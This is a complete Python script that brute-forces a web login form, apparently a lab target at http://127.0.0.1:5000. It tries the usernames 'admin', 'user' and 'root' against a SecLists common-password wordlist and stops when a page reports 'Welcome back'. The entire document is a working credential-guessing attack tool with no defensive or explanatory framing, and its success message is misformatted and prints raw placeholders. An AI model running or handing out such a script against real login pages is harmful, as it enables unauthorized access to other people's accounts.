import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "root"]
passwords = "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
success_msg = "Welcome back"


for username in usernames:
	with open(passwords, "r") as passwords_list:
		for password in passwords_list:
			password = password.strip("\n").encode()
			sys.stdout.write("Bruteforcing {}:{}\r".format(username, password.decode()))
			sys.stdout.flush()
			r = requests.post(target, data={"username": username, "password": password})
			if success_msg.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t >>>>>> Found >>> {username} : {password}")
				sys.exit()

		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write(f"No password found for {username}")